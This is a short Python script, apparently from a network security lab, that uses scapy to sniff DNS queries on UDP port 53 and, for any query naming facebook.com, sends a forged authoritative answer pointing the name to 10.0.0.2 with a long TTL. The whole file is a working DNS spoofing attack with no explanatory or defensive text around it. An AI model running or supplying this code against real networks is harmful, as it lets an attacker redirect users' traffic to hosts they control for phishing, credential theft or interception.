#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
        if (DNS in pkt and b'facebook.com' in pkt[DNS].qd.qname):
                # Swap the source and destination IP address
                IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

                # Swap the source and destination port number
                UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

                # The Answer Section
                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=303030, rdata='10.0.0.2')

                # Construct the DNS packet
                DNSpkt = DNS(id=pkt[DNS].id, qr=1,aa=1, qd=DNSQR(qname='facebook.com',qtype='A', qclass='IN'), an=Anssec)

                # Construct the entire IP packet
                spoofpkt = IPpkt/UDPpkt/DNSpkt
                send(spoofpkt)
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)